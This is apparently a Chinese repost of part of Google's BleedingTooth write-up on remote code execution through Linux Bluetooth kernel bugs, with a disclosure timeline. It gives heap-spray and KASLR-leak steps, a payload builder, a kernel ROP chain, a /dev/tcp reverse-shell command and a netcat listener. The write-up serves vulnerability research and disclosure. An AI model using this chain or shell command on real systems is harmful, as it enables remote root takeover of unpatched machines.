// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/a2mp.c
static int a2mp_getinfo_rsp(struct amp_mgr *mgr, struct sk_buff *skb,
          struct a2mp_cmd *hdr)
{
  struct a2mp_info_rsp *rsp = (struct a2mp_info_rsp *) skb->data;
  ...
  ctrl = amp_ctrl_add(mgr, rsp->id);
  ...
}
```  
  
这几乎是完美的堆原语，因为大小和内容可以是任意的！唯一的缺点是没有方便的原语允许我们释放分配。似乎释放它们的唯一方法是关闭 HCI 连接，这是一个相对较慢的操作。然而，要了解如何以受控的方式释放分配（例如，释放每秒的分配以创建漏洞），我们需要密切关注内存管理。请注意，当我们在 处存储新的内存地址时ctrl->assoc  
，我们不会释放先前存储在那里的内存块。相反，当我们覆盖它时，该内存块将被遗忘。为了利用这种行为，我们可以用ctrl->assoc  
不同大小的分配覆盖每秒的分配，一旦我们关闭 HCI 连接，另一半将被释放，而我们覆盖的一半仍然分配。  
### 控制越界读取  
  
那么我们为什么要有堆原语呢？回想一下，我们的想法是塑造堆并实现一个星座，其中我们控制的内存块位于距离对象一个块的位置struct amp_mgr  
。通过这样做，我们可以控制偏移量 0x110 处表示指针的值sk_filter  
。因此，当我们触发类型混淆时，我们可以取消引用任意指针。  
  
以下基本技术在使用 SLUB 分配器的 Ubuntu 上非常可靠地运行：  
1. 分配大量大小为 128 字节的对象来填充 kmalloc-128 板。  
  
1. 创建一个新的A2MP通道，并希望该struct amp_mgr  
物体与被喷涂的物体相邻。  
  
1. 触发类型混淆，实现受控的越界读取。  
  
为了验证我们的堆喷射是否成功，我们可以首先查询/proc/slabinfo  
受害者机器上有关 kmalloc-128 的信息：  
```
$ sudo cat /proc/slabinfo
slabinfo - version: 2.1
# name            <active_objs> <num_objs> <objsize> <objperslab> <pagesperslab> : tunables <limit> <batchcount> <sharedfactor> : slabdata <active_slabs> <num_slabs> <sharedavail>
...
kmalloc-128         1440   1440    128   32    1 : tunables    0    0    0 : slabdata     45     45      0
...
```  
  
然后，在堆喷射之后，我们再次查询，发现active_objs  
增加了：  
```
$ sudo cat /proc/slabinfo
...
kmalloc-128         1760   1760    128   32    1 : tunables    0    0    0 : slabdata     55     55      0
...
```  
  
在上面的例子中，我们喷射了 320 个对象。现在，如果我们设法struct amp_mgr  
在这些新喷射的对象周围分配对象，我们可能会在尝试取消引用受控指针时遇到恐慌（观察 RAX 的值）：  
```
[   58.881623] general protection fault: 0000 [#1] SMP PTI
[   58.881639] CPU: 3 PID: 568 Comm: kworker/u9:1 Not tainted 5.4.0-48-generic #52-Ubuntu
[   58.881645] Hardware name: Acer Aspire E5-575/Ironman_SK  , BIOS V1.04 04/26/2016
[   58.881705] Workqueue: hci0 hci_rx_work [bluetooth]
[   58.881725] RIP: 0010:sk_filter_trim_cap+0x65/0x220
[   58.881734] Code: 00 00 4c 89 e6 48 89 df e8 b8 c5 af ff 41 89 c5 85 c0 75 62 48 8b 83 10 01 00 00 48 85 c0 74 56 49 8b 4c 24 18 49 89 5c 24 18 <4c> 8b 78 18 48 89 4d b0 41 f6 47 02 08 0f 85 41 01 00 00 0f 1f 44
[   58.881740] RSP: 0018:ffffbbccc10d3ca0 EFLAGS: 00010202
[   58.881748] RAX: 4343434343434343 RBX: ffff96da38f70300 RCX: 0000000000000000
[   58.881753] RDX: 0000000000000000 RSI: ffff96da62388300 RDI: ffff96da38f70300
[   58.881758] RBP: ffffbbccc10d3d00 R08: ffff96da38f67700 R09: ffff96da68003340
[   58.881763] R10: 00000000000301c0 R11: 8075f638da96ffff R12: ffff96da62388300
[   58.881767] R13: 0000000000000000 R14: 0000000000000001 R15: 0000000000000008
[   58.881774] FS:  0000000000000000(0000) GS:ffff96da69380000(0000) knlGS:0000000000000000
[   58.881780] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[   58.881785] CR2: 000055f861e4bd20 CR3: 000000024c80a001 CR4: 00000000003606e0
[   58.881790] Call Trace:
[   58.881869]  ? __l2cap_chan_add+0x88/0x1c0 [bluetooth]
[   58.881938]  l2cap_data_rcv+0x351/0x510 [bluetooth]
[   58.881995]  l2cap_data_channel+0x29f/0x470 [bluetooth]
[   58.882054]  l2cap_recv_frame+0xe5/0x300 [bluetooth]
[   58.882067]  ? __switch_to_asm+0x40/0x70
[   58.882124]  l2cap_recv_acldata+0x2d2/0x2e0 [bluetooth]
[   58.882174]  hci_rx_work+0x186/0x360 [bluetooth]
[   58.882187]  process_one_work+0x1eb/0x3b0
[   58.882197]  worker_thread+0x4d/0x400
[   58.882207]  kthread+0x104/0x140
[   58.882215]  ? process_one_work+0x3b0/0x3b0
[   58.882223]  ? kthread_park+0x90/0x90
[   58.882233]  ret_from_fork+0x35/0x40
```  
  
检查受害者机器的RDI处的内存地址，我们可以看到：  
```
$ sudo gdb /boot/vmlinuz /proc/kcore
(gdb) x/40gx 0xffff96da38f70300
0xffff96da38f70300:  0xffff96da601e7d00  0xffffffffc0d38760
0xffff96da38f70310:  0xffff96da60de2600  0xffff96da61c13400
0xffff96da38f70320:  0x0000000000000000  0x0000000000000001
0xffff96da38f70330:  0x0000000000000000  0x0000000000000000
0xffff96da38f70340:  0xffff96da38f70340  0xffff96da38f70340
0xffff96da38f70350:  0x0000000000000000  0x0000000000000000
0xffff96da38f70360:  0xffff96da38f70360  0xffff96da38f70360
0xffff96da38f70370:  0x0000000000000000  0x0000000000000000
0xffff96da38f70380:  0xffffffffffffffff  0xffffffffffffffff
0xffff96da38f70390:  0xffffffffffffffff  0xffffffffffffffff
0xffff96da38f703a0:  0xffffffffffffffff  0xffffffffffffffff
0xffff96da38f703b0:  0xffffffffffffffff  0xffffffffffffffff
0xffff96da38f703c0:  0xffffffffffffffff  0xffffffffffffffff
0xffff96da38f703d0:  0xffffffffffffffff  0xffffffffffffffff
0xffff96da38f703e0:  0xffffffffffffffff  0xffffffffffffffff
0xffff96da38f703f0:  0xffffffffffffffff  0xffffffffffffffff
0xffff96da38f70400:  0x4141414141414141  0x4242424242424242
0xffff96da38f70410:  0x4343434343434343  0x4444444444444444
0xffff96da38f70420:  0x4545454545454545  0x4646464646464646
0xffff96da38f70430:  0x4747474747474747  0x4848484848484848
```  
  
处的值0xffff96da38f70410  
表明sk_filter()  
确实试图取消引用我们喷射的偏移量为 0x10 的指针，从 的角度来看struct amp_mgr  
，该指针的偏移量为 0x110。Bingo！  
### 泄漏内存布局  
  
现在，我们有了一种方法，可以塑造堆并为BadKarma  
攻击做好准备，从而完全控制指针sk_filter  
。问题是，我们应该将它指向哪里？为了使该原语有用，我们必须将其指向我们可以控制其内容的内存地址。这就是BadChoice  
漏洞发挥作用的地方。此漏洞有可能泄露内存布局，并帮助我们实现控制我们也知道其地址的内存块的目标。  
  
如前所述，为了利用未初始化堆栈变量错误，我们必须首先发送一些不同的命令，用有趣的数据（例如指向堆的指针或与 ROP 链相关的 .text 段）填充堆栈框架。然后，我们可以发送易受攻击的命令来接收该数据。  
  
通过尝试一些随机的 L2CAP 命令，我们可以观察到，通过触发 BadChoice 而不事先使用任何特殊命令，可以泄露指向内核映像的 .text 段指针。此外，通过发送L2CAP_CONF_RSP  
并尝试预先将 A2MP 通道重新配置为L2CAP_MODE_ERTM  
，可以泄露偏移量为 0x110 的对象的地址struct l2cap_chan  
。该对象的大小为 792 字节，分配在 kmalloc-1024 slab 中。  
```
// pahole -E -C l2cap_chan --hex bluetooth.ko
struct l2cap_chan {
  ...
  struct delayed_work {
    struct work_struct {
      /* typedef atomic_long_t -> atomic64_t */ struct {
        /* typedef s64 -> __s64 */ long long int counter;        /* 0x110   0x8 */
      } data; /* 0x110   0x8 */
      ...
    } work; /* 0x110  0x20 */
    ...
  } chan_timer; /* 0x110  0x58 */
  ...
  /* size: 792, cachelines: 13, members: 87 */
  /* sum members: 774, holes: 9, sum holes: 18 */
  /* paddings: 4, sum paddings: 16 */
  /* last cacheline: 24 bytes */
};
```  
  
事实证明，该对象属于 A2MP 通道，可以通过破坏通道来释放它。这很有用，因为它允许我们应用与 Use-After-Free 攻击相同的策略。  
  
考虑以下技术：  
1. 泄露对象的地址struct l2cap_chan  
。  
  
1. struct l2cap_chan  
通过破坏 A2MP 通道来释放物体。  
  
1. 重新连接 A2MP 通道并使用堆原语喷射 kmalloc-1024 板。  
  
1. 有可能它会回收前一个对象的地址struct l2cap_chan  
。  
  
换句话说，原来属于的地址struct l2cap_chan  
现在可能属于我们了！同样，使用的技术非常基础，但在使用 SLUB 分配器的 Ubuntu 上工作得相当可靠。令人担忧的是，当重新连接 A2MP 通道时，前者struct l2cap_chan  
可能会在堆喷射可以回收该位置之前被新通道重新占用struct l2cap_chan  
。如果是这种情况，可以使用多个连接，以便能够继续喷射，即使另一个连接已关闭。  
  
请注意，在 kmalloc-1024 slab 中分配对象比在 kmalloc-128 slab 中分配对象稍微复杂一些，因为：  
- ACL MTU 通常小于 1024 字节（可以使用 检查hciconfig  
）。  
  
- A2MP 通道的默认 MTU 为L2CAP_A2MP_DEFAULT_MTU=670  
字节。  
  
这两种 MTU 限制都很容易绕过。也就是说，我们可以通过将请求分割成多个 L2CAP 数据包来绕过 ACL MTU，我们可以通过发送响应L2CAP_CONF_MTU  
并将其配置为 0xffff 字节来绕过 A2MP MTU。同样，不清楚为什么蓝牙规范没有明确禁止在未发送请求的情况下解析配置响应。  
  
让我们尝试一下这项技术：  
```
$ gcc -o exploit exploit.c -lbluetooth && sudo ./exploit XX:XX:XX:XX:XX:XX
[*] Opening hci device...
[*] Connecting to victim...
[+] HCI handle: 100
[*] Connecting A2MP channel...
[*] Leaking A2MP kernel stack memory...
[+] Kernel address: ffffffffad2001a4
[+] KASLR offset: 2b600000
[*] Preparing to leak l2cap_chan address...
[*] Leaking A2MP kernel stack memory...
[+] l2cap_chan address: ffff98ee5c62fc00
[*] Spraying kmalloc-1024...
```  
  
请注意，两个泄漏指针的最高有效字节有何不同。通过观察较高的字节，我们可以做出有根据的猜测（或检查 Linux 文档）来确定它们是属于段、堆还是堆栈。为了确认我们确实能够回收的地址struct l2cap_chan  
，我们可以使用以下命令检查受害者机器上的内存：  
```
$ sudo gdb /boot/vmlinuz /proc/kcore
(gdb) x/40gx 0xffff98ee5c62fc00
0xffff98ee5c62fc00:  0x4141414141414141  0x4242424242424242
0xffff98ee5c62fc10:  0x4343434343434343  0x4444444444444444
0xffff98ee5c62fc20:  0x4545454545454545  0x4646464646464646
0xffff98ee5c62fc30:  0x4747474747474747  0x4848484848484848
...
0xffff98ee5c62fd00:  0x6161616161616161  0x6262626262626262
0xffff98ee5c62fd10:  0x6363636363636363  0x6464646464646464
0xffff98ee5c62fd20:  0x6565656565656565  0x6666666666666666
0xffff98ee5c62fd30:  0x6767676767676767  0x6868686868686868
```  
  
内存内容看起来非常有希望！请注意，使用模式进行喷射非常有用，因为这使我们能够立即识别内存块，并了解在发生恐慌时哪些偏移量会被取消引用。  
### 将所有东西整合在一起  
  
现在，我们已经拥有完成 RCE 所需的所有原语：  
1. 我们可以控制我们知道其地址的内存块（称为“有效负载”）。  
  
1. 我们可以泄漏一个 .text 段指针并构建一个 ROP 链，将其存储在有效载荷中。  
  
1. 我们可以完全控制该sk_filter  
领域并将其指向我们的有效载荷。  
  
#### 实现 RIP 控制  
  
让我们回顾一下sk_filter_trim_cap()  
，并了解为什么控制sk_filter  
是有益的。  
```
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/core/filter.c
int sk_filter_trim_cap(struct sock *sk, struct sk_buff *skb, unsigned int cap)
{
  ...
  rcu_read_lock();
  filter = rcu_dereference(sk->sk_filter);
  if (filter) {
    struct sock *save_sk = skb->sk;
    unsigned int pkt_len;

    skb->sk = sk;
    pkt_len = bpf_prog_run_save_cb(filter->prog, skb);
    skb->sk = save_sk;
    err = pkt_len ? pskb_trim(skb, max(cap, pkt_len)) : -EPERM;
  }
  rcu_read_unlock();

  return err;
}
```  
  
由于我们可以控制 的值filter  
，因此我们也可以filter->prog  
通过在有效载荷中的偏移量 0x18 处放置一个指针来控制。也就是说，这是 的偏移量prog  
：  
```
// pahole -E -C sk_filter --hex bluetooth.ko
struct sk_filter {
  ...
  struct bpf_prog *          prog;                                                 /*  0x18   0x8 */

  /* size: 32, cachelines: 1, members: 3 */
  /* sum members: 28, holes: 1, sum holes: 4 */
  /* forced alignments: 1, forced holes: 1, sum forced holes: 4 */
  /* last cacheline: 32 bytes */
} __attribute__((__aligned__(8)));
```  
  
这里，的结构struct buf_prog  
为：  
```
// pahole -E -C bpf_prog --hex bluetooth.kostruct bpf_prog {	...unsignedint               (*bpf_func)(constvoid*, conststruct bpf_insn  *); /*  0x30   0x8 */union {		...struct bpf_insn {/* typedef __u8 */unsignedchar code;                           /*  0x38   0x1 *//* typedef __u8 */unsignedchar dst_reg:4;                      /*  0x39: 0 0x1 *//* typedef __u8 */unsignedchar src_reg:4;                      /*  0x39:0x4 0x1 *//* typedef __s16 */shortint  off;                              /*  0x3a   0x2 *//* typedef __s32 */int        imm;                              /*  0x3c   0x4 */		} insnsi[0]; /*  0x38     0 */	};                                                                               /*  0x38     0 *//* size: 56, cachelines: 1, members: 20 *//* sum members: 50, holes: 1, sum holes: 4 *//* sum bitfield members: 10 bits, bit holes: 1, sum bit holes: 6 bits *//* last cacheline: 56 bytes */};
```  
  
bpf_prog_run_save_cb()  
然后该函数传递filter->prog  
给BPF_PROG_RUN()  
：  
```
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/filter.hstaticinline u32 __bpf_prog_run_save_cb(conststruct bpf_prog *prog,struct sk_buff *skb){	...	res = BPF_PROG_RUN(prog, skb);	...return res;}staticinline u32 bpf_prog_run_save_cb(conststruct bpf_prog *prog,struct sk_buff *skb){	u32 res;	migrate_disable();	res = __bpf_prog_run_save_cb(prog, skb);	migrate_enable();return res;}
```  
  
反过来调用bpf_dispatcher_nop_func()  
，ctx  
和prog->insnsi  
作为prog->bpf_func()  
参数：  
```
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/filter.h
#define __BPF_PROG_RUN(prog, ctx, dfunc)  ({      \
  u32 ret;              \
  cant_migrate();              \
  if (static_branch_unlikely(&bpf_stats_enabled_key)) {    \
    ...
    ret = dfunc(ctx, (prog)->insnsi, (prog)->bpf_func);  \
    ...
  } else {              \
    ret = dfunc(ctx, (prog)->insnsi, (prog)->bpf_func);  \
  }                \
  ret; })

#define BPF_PROG_RUN(prog, ctx)            \
  __BPF_PROG_RUN(prog, ctx, bpf_dispatcher_nop_func)
```  
  
最后，调度程序prog->bpf_func()  
使用ctx  
和prog->insnsi  
作为参数调用处理程序：  
```
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/bpf.h
static __always_inline unsigned int bpf_dispatcher_nop_func(
  const void *ctx,
  const struct bpf_insn *insnsi,
  unsigned int (*bpf_func)(const void *,
         const struct bpf_insn *))
{
  return bpf_func(ctx, insnsi);
}
```  
  
总而言之，我们有：  
```
sk->sk_filter->prog->bpf_func(skb, sk->sk_filter->prog->insnsi);
```  
  
由于我们可以控制sk->sk_filter  
，因此我们也可以控制后面两个取消引用。这最终使我们拥有 RIP 控制权，其中 RSI 寄存器（第二个参数）指向我们的有效载荷。  
#### 内核堆栈透视  
  
由于现代 CPU 具有 NX，因此无法直接执行 shellcode。但是，我们可以执行代码重用攻击，例如 ROP/JOP。当然，为了重用代码，我们必须知道它的位置，这就是 KASLR 绕过必不可少的原因。关于可能的攻击，ROP 通常比 JOP 更容易执行，但这需要我们重定向堆栈指针 RSP。出于这个原因，漏洞利用开发人员通常执行 JOP 以进行堆栈枢转，然后以 ROP 链结束。  
  
这个想法是将堆栈指针重定向到由 ROP 小工具组成的有效载荷中的假堆栈，即我们的 ROP 链。由于我们知道 RSI 指向我们的有效载荷，因此我们希望将 RSI 的值移动到 RSP。让我们看看是否有小工具可以让我们这样做。  
  
为了提取小工具，我们可以使用以下工具：  
- extract-vmlinux  
解压缩/boot/vmlinuz  
。  
  
- ROPgadget  
从中提取 ROP 小工具vmlinux  
。  
  
寻找类似的小工具mov rsp, X ; ret  
，我们发现它们都没用。  
```
$ cat gadgets.txt | grep ": mov rsp.*ret"
0xffffffff8109410c : mov rsp, qword ptr [rip + 0x15bb0fd] ; pop rbx ; pop rbp ; ret
0xffffffff810940c2 : mov rsp, qword ptr [rsp] ; pop rbp ; ret
0xffffffff8108ef0c : mov rsp, rbp ; pop rbp ; ret
```  
  
也许有类似的东西push rsi ; pop rsp ; ret  
？  
```
$ cat gadgets.txt | grep ": push rsi.*pop rsp.*ret"
0xffffffff81567f46 : push rsi ; adc al, 0x57 ; add byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret
0xffffffff8156a128 : push rsi ; add byte ptr [rbx + 0x41], bl ; pop rsp ; pop r13 ; pop rbp ; ret
0xffffffff81556cad : push rsi ; add byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret
0xffffffff81c02ab5 : push rsi ; lcall [rbx + 0x41] ; pop rsp ; pop rbp ; ret
0xffffffff8105e049 : push rsi ; sbb byte ptr [rbx + 0x41], bl ; pop rsp ; pop rbp ; ret
0xffffffff81993887 : push rsi ; xchg eax, ecx ; lcall [rbx + 0x41] ; pop rsp ; pop r13 ; pop rbp ; ret
```  
  
完美，有很多小工具可以使用。有趣的是，所有小工具都会取消引用 RBX+0x41，这很可能是常用指令或指令序列的一部分。具体来说，由于指令可以从 x86 中的任何字节开始，因此可以根据起始字节对它们进行不同的解释。取消引用 RBX+0x41 实际上可能会妨碍我们使用小工具 - 也就是说，如果在执行时 RBX 不包含可写的内存地址bpf_func()  
，我们将在执行 ROP 链之前遇到 panic。幸运的是，在我们的例子中，RBX 指向对象struct amp_mgr  
，并且如果偏移量 0x41 处的字节发生变化，也不会造成太大影响。  
  
当选择 stack pivot gadget 作为函数指针bpf_func()  
并触发它时，RSI 的值将被推送到堆栈上，然后从堆栈中弹出并最终分配给 RSP。换句话说，堆栈指针将指向我们的有效载荷，一旦RET  
执行该指令，我们的 ROP 链就会启动。  
```
static void build_payload(uint8_t data[0x400]) {
  // Fake sk_filter object starting at offset 0x300.
  *(uint64_t *)&data[0x318] = l2cap_chan_addr + 0x320;  // prog

  // Fake bpf_prog object starting at offset 0x320.
  // RBX points to the amp_mgr object.
  *(uint64_t *)&data[0x350] =
      kaslr_offset +
      PUSH_RSI_ADD_BYTE_PTR_RBX_41_BL_POP_RSP_POP_RBP_RET;  // bpf_func
  *(uint64_t *)&data[0x358] = 0xDEADBEEF;                   // rbp

  // Build kernel ROP chain that executes run_cmd() from kernel/reboot.c.
  // Note that when executing the ROP chain, the data below in memory will be
  // overwritten. Therefore, the argument should be located after the ROP chain.
  build_krop_chain((uint64_t *)&data[0x360], l2cap_chan_addr + 0x3c0);
  strncpy(&data[0x3c0], remote_command, 0x40);
}
```  
  
这样，我们终于实现了 RCE。要调试我们的 stack pivot 并查看是否成功，我们可以设置*(uint64_t *)&data[0x360]=0x41414141  
并观察受控的 panic。  
#### 内核 ROP 链执行  
  
现在，我们可以编写一个大的 ROP 链来检索和执行 C 有效负载，或者编写一个较小的 ROP 链来允许我们运行任意命令。为了进行概念验证，我们已经对反向 shell 感到满意，因此执行命令对我们来说就足够了。受到  
CVE-2019-18683：利用 V4L2 子系统中的 Linux 内核漏洞 中描述的 ROP 链的启发  
，我们将构建一个调用 的链run_cmd()  
来/bin/bash -c /bin/bash</dev/tcp/IP/PORT  
生成反向 shell，最后调用do_task_dead()  
来停止内核线程。此后，蓝牙将不再工作。在更复杂的利用中，我们将恢复执行。  
  
为了确定这两种方法的偏移量，我们可以简单地检查受害者机器上的活动符号：  
```
$ sudo cat /proc/kallsyms | grep "run_cmd\|do_task_dead"
ffffffffab2ce470 t run_cmd
ffffffffab2dc260 T do_task_dead
```  
  
这里，KASLR 滑动是 0x2a200000，可以通过 grep 查找_text  
符号并减去来计算0xffffffff81000000  
：  
```
$ sudo cat /proc/kallsyms | grep "T _text"
ffffffffab200000 T _text
```  
  
从之前的两个地址中减去幻灯片可得出：  
```
#define RUN_CMD 0xffffffff810ce470
#define DO_TASK_DEAD 0xffffffff810dc260
```  
  
最后，我们可以找到pop rax ; ret  
，pop rdi ; ret  
和jmp rax  
ROPgadget的gadget，然后我们可以根据这个例子构建内核ROP链：  
```
static void build_krop_chain(uint64_t *rop, uint64_t cmd_addr) {
  *rop++ = kaslr_offset + POP_RAX_RET;
  *rop++ = kaslr_offset + RUN_CMD;
  *rop++ = kaslr_offset + POP_RDI_RET;
  *rop++ = cmd_addr;
  *rop++ = kaslr_offset + JMP_RAX;
  *rop++ = kaslr_offset + POP_RAX_RET;
  *rop++ = kaslr_offset + DO_TASK_DEAD;
  *rop++ = kaslr_offset + JMP_RAX;
}
```  
  
此 ROP 链应放置在伪造struct bpf_prog  
对象内的偏移量 0x40 处，并cmd_addr  
应指向植入内核内存中的 bash 命令。一切就绪后，我们终于可以从受害者那里获取 root shell。  
## 概念验证  
  
概念验证可在  
https://github.com/google/security-research/tree/master/pocs/linux/bleedingtooth  
获得。  
  
使用以下方法编译：  
```
$ gcc -o exploit exploit.c -lbluetooth
```  
  
并执行如下：  
```
$ sudo ./exploit target_mac source_ip source_port
```  
  
在另一个终端中运行：  
```
$ nc -lvp 1337
exec bash -i 2>&0 1>&0
```  
  
如果成功，则可以使用以下命令生成计算：  
```
export XAUTHORITY=/run/user/1000/gdm/Xauthority
export DISPLAY=:0
gnome-calculator
```  
  
有时，受害者可能会Bluetooth: Trailing bytes: 6 in sframe在 dmesg 中打印。如果 kmalloc-128 slab spray 未成功，就会发生这种情况。在这种情况下，我们需要重复利用漏洞。关于名称“BadKarma”的轶事是，BadKarma漏洞偶尔会在早期成功退出sk_filter()，例如当字段sk_filter为 0 时，并继续执行 A2MP 接收处理程序并发回 A2MP 响应数据包。有趣的是，当这种情况发生时，受害者的机器并没有崩溃 - 相反，攻击者的机器会崩溃；因为，正如我们之前了解到的，A2MP 协议使用的 ERTM 实现在设计上会触发类型混淆。  
  
时间线  
  
2020-07-06 – Google 内部发现BadVibes  
漏洞   
  
2020-07-20 – Google 内部发现BadKarma和BadChoice漏洞   
  
2020-07-22 – Linus Torvalds向 BlueZ报告独立发现BadVibes漏洞，并给出 7 天的披露时间表   
  
2020-07-24 – 向BlueZ 主要开发人员（英特尔）  
报告的三个 BleedingTooth 漏洞的技术细节   
  
2020-07-29 – 英特尔计划于   
  
2020-07-31 与谷歌举行会议   
  
2020-07-30 – BadVibes修复程序发布   
  
2020-07-31 – 英特尔将披露日期定为   
  
2020-09-01，并由英特尔协调进行先前的 NDA 披露。知情方获准通过 kconfig 禁用 BT_HS，并提供非安全提交消息   
  
2020-08-12 – 英特尔将披露日期调整为   
  
2020-10-13（距离初始报告 90 天）   
  
2020-09-25 – 英特尔向公共bluetooth-next分支提交补丁   
  
2020-09-29 – 补丁与5.10 linux-next 分支合并。   
  
2020-10-13 – 公开披露英特尔的咨询报告，随后披露谷歌的咨询报告   
  
2020-10-14 – 英特尔将建议的修复版本从 5.9 更正为 5.10 内核   
  
2020-10-15 – 英特尔删除内核升级建议  
  
结论  
  
从零知识开始到发现蓝牙 HCI 协议中的三个漏洞，这一过程既奇怪又出乎意料。当我第一次发现BadVibes漏洞时，我认为它只能由易受攻击/恶意的蓝牙芯片触发，因为这个漏洞似乎太明显了。由于我没有两个带有蓝牙 5 的可编程设备，因此我无法验证是否有可能收到如此大的广告。只有在将 Linux 蓝牙堆栈与其他实现进行比较并阅读规范后，我才得出结论，我确实发现了我的第一个 RCE 漏洞，然后我立即出去购买了另一台笔记本电脑（令人惊讶的是，市场上没有值得信赖的 BT5 加密狗）。分析溢出后，很快就清楚需要额外的信息泄露漏洞。比我想象的要快得多，我只用了两天就发现了BadChoice 。在尝试触发它时，我发现了BadKarma漏洞，我最初认为这是一个不幸的漏洞，可以防止BadChoice漏洞。事实证明，它很容易绕过，而且这个漏洞实际上是另一个高严重性安全漏洞。研究 Linux 蓝牙堆栈并开发 RCE 漏洞既有挑战性又令人兴奋，尤其是因为这是我第一次审计和调试 Linux 内核。我很高兴，这项工作的结果是，决定默认禁用蓝牙高速功能，以减少攻击面，这也意味着删除强大的堆原语。此外，我将从这项研究中获得的知识转化为syzkaller 贡献，从而可以对/dev/vhci设备进行模糊测试并发现 40 多个其他错误。虽然大多数这些错误不太可能被利用，甚至不可能被远程触发，但它们允许工程师识别和修复其他弱点（蓝牙：修复 hci_event_packet() 中的空指针取消引用、蓝牙：修复 read_adv_mon_features() 中的内存泄漏或蓝牙：修复 hci_extended_inquiry_result_evt() 中的 slab 越界读取），从而有助于拥有更安全、更稳定的内核。  
  
```
https://google.github.io/security-research/pocs/linux/bleedingtooth/writeup.html
```  
  
  
  
  
感谢您抽出  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycNnFvFYVgXoExRy0gqCkqvrAghf8KPXnwQaYq77HMsjcVka7kPcBDQw/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycd5KMTutPwNWA97H5MPISWXLTXp0ibK5LXCBAXX388gY0ibXhWOxoEKBA/640?wx_fmt=gif "")  
  
.  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWgdSBqOibtgiaYWjL4pkRXwycU99fZEhvngeeAhFOvhTibttSplYbBpeeLZGgZt41El4icmrBibojkvLNw/640?wx_fmt=gif "")  
  
来阅读本文  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/Ljib4So7yuWge7Mibiad1tV0iaF8zSD5gzicbxDmfZCEL7vuOevN97CwUoUM5MLeKWibWlibSMwbpJ28lVg1yj1rQflyQ/640?wx_fmt=gif "")  
  
**点它，分享点赞在看都在这里**  
  
